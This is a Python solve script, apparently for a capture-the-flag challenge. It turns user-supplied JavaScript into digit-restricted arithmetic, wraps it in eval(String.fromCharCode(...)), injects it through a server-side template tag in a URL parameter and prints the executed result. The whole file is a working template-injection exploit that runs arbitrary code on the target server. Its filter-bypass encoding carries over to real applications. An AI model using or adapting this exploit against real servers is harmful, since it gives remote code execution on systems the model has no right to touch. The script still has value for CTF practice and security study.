from urllib.parse import quote as urlencode
import requests
from bs4 import BeautifulSoup

print('Imaginary CTF 1337 task')
code = input('JS CODE >>> ')
a = [ord(c) for c in code]

# a = [ 105, 109, 112, 111, 114, 116, 32, 80, 97, 116, 104, 32, 102, 114, 111, 109, 32, 39, 64, 109, 111, 106, 111, 106, 115, 47, 112, 97, 116, 104, 39, 59 ]

payload = ""
for ind, c in enumerate(a):
 r = ""
 s = 0
 if abs(8*8 - c) < abs(8*8*2 - c):
  r += "8*8"
 else:
  r += "8*8*2"
 
 s = eval(r)
 while c != s:
  if c > s:
   sign = "+"
  else:
   sign = "-"
  
  diff = abs(c-s)
  if diff >= 9:
   r += sign+"9"
  elif diff >= 8:
   r += sign+"9"
  elif diff >= 2:
   r += sign+"2"
  else:
   r += sign+"2/2"
  
  s = eval(r)
 payload += r+"," if ind != len(a)-1 else r

payload = "eval(String.fromCharCode("+payload+"))" 
req = requests.get(f"http://1337.chal.imaginaryctf.org/?text=%3C%25%3D{urlencode(payload)}%25%3E&dir=from")
soup = BeautifulSoup(req.text, "html.parser")
try:
    result = soup.body.main.h1.text
    print(result)
except:
    print('invalid JS code')